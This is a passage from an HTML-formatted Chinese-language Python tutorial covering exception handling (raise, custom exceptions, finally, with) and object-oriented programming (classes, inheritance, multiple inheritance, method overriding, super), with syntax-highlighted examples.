punctuation">)</span><span class="token keyword">finally</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'这句话，无论异常是否发生都会执行。'</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''这句话，无论异常是否发生都会执行。Traceback (most recent call last):  File xxxx in &lt;module&gt;    runoob()NameError: name 'runoob' is not defined'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="抛出异常"><a href="#抛出异常" class="headerlink" title="抛出异常"></a>抛出异常</h3><p> 使用 raise 语句抛出一个指定的异常</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">raise</span> <span class="token punctuation">[</span>Exception <span class="token punctuation">[</span><span class="token punctuation">,</span> args <span class="token punctuation">[</span><span class="token punctuation">,</span> traceback<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">if</span> x <span class="token operator">&gt;</span> <span class="token number">5</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'x 不能大于 5。x 的值为: {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''Traceback (most recent call last):  File xxx in &lt;module&gt;    raise Exception('x 不能大于 5。x 的值为: {}'.format(x))Exception: x 不能大于 5。x 的值为: 10'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> NameError<span class="token punctuation">(</span><span class="token string">'HiThere'</span><span class="token punctuation">)</span><span class="token keyword">except</span> NameError<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'An exception flew by!'</span><span class="token punctuation">)</span>    <span class="token keyword">raise</span>    <span class="token triple-quoted-string string">'''Traceback (most recent call last):  File xxxx in &lt;module&gt;    raise NameError('HiThere')NameError: HiThere'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="用户自定义异常"><a href="#用户自定义异常" class="headerlink" title="用户自定义异常"></a>用户自定义异常</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyError</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>value <span class="token operator">=</span> value    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> MyError<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">except</span> MyError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'My exception occurred, value:'</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token keyword">raise</span> MyError<span class="token punctuation">(</span><span class="token string">'oops!'</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''Traceback (most recent call last):  File xxx in &lt;module&gt;    raise MyError('oops!')__main__.MyError: 'oops!'My exception occurred, value: 4'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="定义清理行为"><a href="#定义清理行为" class="headerlink" title="定义清理行为"></a>定义清理行为</h3><p>不管 try 子句里面有没有发生异常，finally 子句都会执行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> KeyboardInterrupt<span class="token keyword">finally</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Goodbye, world!'</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''Traceback (most recent call last):  File xxx in &lt;module&gt;    raise KeyboardInterruptKeyboardInterruptGoodbye, world!'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="预定义的清理行为"><a href="#预定义的清理行为" class="headerlink" title="预定义的清理行为"></a>预定义的清理行为</h3><p>一些对象定义了标准的清理行为，无论系统是否成功的使用了它，一旦不需要它了，那么这个标准的清理行为就会执行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"myfile.txt"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>以上这段代码的问题是，当执行完毕后，文件会保持打开状态，并没有被关闭</p><p>关键词 with 语句就可以保证诸如文件之类的对象在使用完之后一定会正确的执行他的清理方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"myfile.txt"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以上这段代码执行完毕后，就算在处理过程中出问题了，文件 f 总是会关闭</p><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ul><li><strong>类(Class):</strong> 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。</li><li><strong>方法：</strong>类中定义的函数。</li><li><strong>类变量：</strong>类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。</li><li><strong>数据成员：</strong>类变量或者实例变量用于处理类及其实例对象的相关的数据。</li><li><strong>方法重写：</strong>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。</li><li><strong>局部变量：</strong>定义在方法中的变量，只作用于当前实例的类。</li><li><strong>实例变量：</strong>在类的声明中，属性是用变量来表示的，这种变量就称为实例变量，实例变量就是一个用 self 修饰的变量。</li><li><strong>继承：</strong>即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。</li><li><strong>实例化：</strong>创建一个类的实例，类的具体对象。</li><li><strong>对象：</strong>通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。</li></ul><h3 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ClassName</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>statement<span class="token operator">-</span><span class="token number">1</span><span class="token operator">&gt;</span>    <span class="token punctuation">.</span>    <span class="token punctuation">.</span>    <span class="token punctuation">.</span>    <span class="token operator">&lt;</span>statement<span class="token operator">-</span>N<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="类对象"><a href="#类对象" class="headerlink" title="类对象"></a>类对象</h3><ol><li>类对象支持属性引用和实例化</li><li>属性引用格式 obj.name</li><li>类对象创建后，类命名空间中所有的命名都是有效属性名</li><li>类有一个名为 _<em>init</em>_() 的特殊方法（<strong>构造方法</strong>），该方法在类实例化时会自动调用</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyClass</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""一个简单的类实例"""</span>    i <span class="token operator">=</span> <span class="token number">12345</span>    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'hello world'</span> <span class="token comment"># 实例化类</span>x <span class="token operator">=</span> MyClass<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 访问类的属性和方法</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"MyClass 类的属性 i 为："</span><span class="token punctuation">,</span> x<span class="token punctuation">.</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"MyClass 类的方法 f 输出为："</span><span class="token punctuation">,</span> x<span class="token punctuation">.</span>f<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''MyClass 类的属性 i 为： 12345MyClass 类的方法 f 输出为： hello world'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Complex</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> realpart<span class="token punctuation">,</span> imagpart<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>r <span class="token operator">=</span> realpart        self<span class="token punctuation">.</span>i <span class="token operator">=</span> imagpartx <span class="token operator">=</span> Complex<span class="token punctuation">(</span><span class="token number">3.0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4.5</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>r<span class="token punctuation">,</span> x<span class="token punctuation">.</span>i<span class="token punctuation">)</span>   <span class="token comment"># 输出结果：3.0 -4.5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>self代表类的实例，而非类</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">prt</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span> t <span class="token operator">=</span> Test<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>prt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''&lt;__main__.Test object at 0x000001A9BBFF6A60&gt;&lt;class '__main__.Test'&gt;'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>self不是关键字，换成其他的也行</p><h3 id="类的方法"><a href="#类的方法" class="headerlink" title="类的方法"></a>类的方法</h3><ol><li>使用def关键字来定义一个方法</li><li>必须包含参数self并且为第一个</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#类定义</span><span class="token keyword">class</span> <span class="token class-name">people</span><span class="token punctuation">:</span>    <span class="token comment">#定义基本属性</span>    name <span class="token operator">=</span> <span class="token string">''</span>    age <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment">#定义私有属性,私有属性在类外部无法直接进行访问</span>    __weight <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment">#定义构造方法</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> n        self<span class="token punctuation">.</span>age <span class="token operator">=</span> a        self<span class="token punctuation">.</span>__weight <span class="token operator">=</span> w    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s 说: 我 %d 岁。"</span> <span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 实例化类</span>p <span class="token operator">=</span> people<span class="token punctuation">(</span><span class="token string">'runoob'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>speak<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''runoob 说: 我 10 岁。'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>子类（派生类 DerivedClassName）会继承父类（基类 BaseClassName）的属性和方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">DerivedClassName</span><span class="token punctuation">(</span>BaseClassName<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>statement<span class="token operator">-</span><span class="token number">1</span><span class="token operator">&gt;</span>    <span class="token punctuation">.</span>    <span class="token punctuation">.</span>    <span class="token punctuation">.</span>    <span class="token operator">&lt;</span>statement<span class="token operator">-</span>N<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基类定义在另一个模块中时</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">DerivedClassName</span><span class="token punctuation">(</span>modname<span class="token punctuation">.</span>BaseClassName<span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#类定义</span><span class="token keyword">class</span> <span class="token class-name">people</span><span class="token punctuation">:</span>    <span class="token comment">#定义基本属性</span>    name <span class="token operator">=</span> <span class="token string">''</span>    age <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment">#定义私有属性,私有属性在类外部无法直接进行访问</span>    __weight <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment">#定义构造方法</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> n        self<span class="token punctuation">.</span>age <span class="token operator">=</span> a        self<span class="token punctuation">.</span>__weight <span class="token operator">=</span> w    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s 说: 我 %d 岁。"</span> <span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#单继承示例</span><span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span>people<span class="token punctuation">)</span><span class="token punctuation">:</span>    grade <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">,</span>g<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#调用父类的构函</span>        people<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>grade <span class="token operator">=</span> g    <span class="token comment">#覆写父类的方法</span>    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s 说: 我 %d 岁了，我在读 %d 年级"</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>age<span class="token punctuation">,</span>self<span class="token punctuation">.</span>grade<span class="token punctuation">)</span><span class="token punctuation">)</span>   s <span class="token operator">=</span> student<span class="token punctuation">(</span><span class="token string">'ken'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>speak<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''ken 说: 我 10 岁了，我在读 3 年级'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>继承时可以直接调用父类构造函数，再添加新的变量</li><li>父类的方法也能直接调用或者重写</li><li>子类不重写 **_<em>init</em><em>**，实例化子类时，会自动调用父类定义的 **_<em>init</em></em>**</li></ol><h3 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">DerivedClassName</span><span class="token punctuation">(</span>Base1<span class="token punctuation">,</span> Base2<span class="token punctuation">,</span> Base3<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token operator">&lt;</span>statement<span class="token operator">-</span><span class="token number">1</span><span class="token operator">&gt;</span>    <span class="token punctuation">.</span>    <span class="token punctuation">.</span>    <span class="token punctuation">.</span>    <span class="token operator">&lt;</span>statement<span class="token operator">-</span>N<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若是父类中有相同的方法名，而在子类使用时未指定，python从左至右搜索 即方法在子类中未找到时，从左到右查找父类中是否包含方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#类定义</span><span class="token keyword">class</span> <span class="token class-name">people</span><span class="token punctuation">:</span>    <span class="token comment">#定义基本属性</span>    name <span class="token operator">=</span> <span class="token string">''</span>    age <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment">#定义私有属性,私有属性在类外部无法直接进行访问</span>    __weight <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment">#定义构造方法</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> n        self<span class="token punctuation">.</span>age <span class="token operator">=</span> a        self<span class="token punctuation">.</span>__weight <span class="token operator">=</span> w    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s 说: 我 %d 岁。"</span> <span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#单继承示例</span><span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span>people<span class="token punctuation">)</span><span class="token punctuation">:</span>    grade <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">,</span>g<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#调用父类的构函</span>        people<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>grade <span class="token operator">=</span> g    <span class="token comment">#覆写父类的方法</span>    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s 说: 我 %d 岁了，我在读 %d 年级"</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>age<span class="token punctuation">,</span>self<span class="token punctuation">.</span>grade<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#另一个类，多重继承之前的准备</span><span class="token keyword">class</span> <span class="token class-name">speaker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    topic <span class="token operator">=</span> <span class="token string">''</span>    name <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> n        self<span class="token punctuation">.</span>topic <span class="token operator">=</span> t    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"我叫 %s，我是一个演说家，我演讲的主题是 %s"</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>topic<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#多重继承</span><span class="token keyword">class</span> <span class="token class-name">sample</span><span class="token punctuation">(</span>speaker<span class="token punctuation">,</span>student<span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">,</span>g<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>        student<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>a<span class="token punctuation">,</span>w<span class="token punctuation">,</span>g<span class="token punctuation">)</span>        speaker<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>n<span class="token punctuation">,</span>t<span class="token punctuation">)</span> test <span class="token operator">=</span> sample<span class="token punctuation">(</span><span class="token string">"Tim"</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"Python"</span><span class="token punctuation">)</span>test<span class="token punctuation">.</span>speak<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#方法名同，默认调用的是在括号中排前地父类的方法</span><span class="token triple-quoted-string string">'''我叫 Tim，我是一个演说家，我演讲的主题是 Python'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法重写"><a href="#方法重写" class="headerlink" title="方法重写"></a>方法重写</h3><p>super() 函数是用于调用父类(超类)的一个方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Parent</span><span class="token punctuation">:</span>        <span class="token comment"># 定义父类</span>   <span class="token keyword">def</span> <span class="token function">myMethod</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'调用父类方法'</span><span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">Child</span><span class="token punctuation">(</span>Parent<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 定义子类</span>   <span class="token keyword">def</span> <span class="token function">myMethod</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'调用子类方法'</span><span class="token punctuation">)</span> c <span class="token operator">=</span> Child<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment"># 子类实例</span>c<span class="token punctuation">.</span>myMethod<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token comment"># 子类调用重写方法</span><span class="token builtin">super</span><span class="token punctuation">(</span>Child<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>myMethod<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#用子类对象调用父类已被覆盖的方法</span><span class="token triple-quoted-string string">'''调用子类方法调用父类方法'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="子类继承父类构造函数说明"><a href="#子类继承父类构造函数说明" class="headerlink" title="子类继承父类构造函数说明"></a>子类继承父类构造函数说明</h3><p>子类不重写 **_<em>init</em><em>**，实例化子类时，会自动调用父类定义的 **_<em>init</em></em>**</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Father</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name<span class="token operator">=</span>name        <span class="token keyword">print</span> <span class="token punctuation">(</span> <span class="token string">"name: %s"</span> <span class="token operator">%</span><span class="token punctuation">(</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">getName</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Father '</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>name <span class="token keyword">class</span> <span class="token class-name">Son</span><span class="token punctuation">(</span>Father<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">getName</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Son '</span><span class="token operator">+</span>self<span class="token punctuation">.</span>name <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    son<span class="token operator">=</span>Son<span class="token punctuation">(</span><span class="token string">'runoob'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token punctuation">(</span> son<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''name: runoobSon runoob'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果重写了<strong>_<em>init</em>_</strong> 时，实例化子类，就不会调用父类已经定义的 <strong>_<em>init</em>_</strong></p><p>如果重写了<strong>_<em>init</em>_</strong> 时，要继承父类的构造方法，可以使用 <strong>super</strong> 关键字</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">super</span><span class="token punctuation">(</span>子类，self<span class="token punctuation">)</span><span class="token 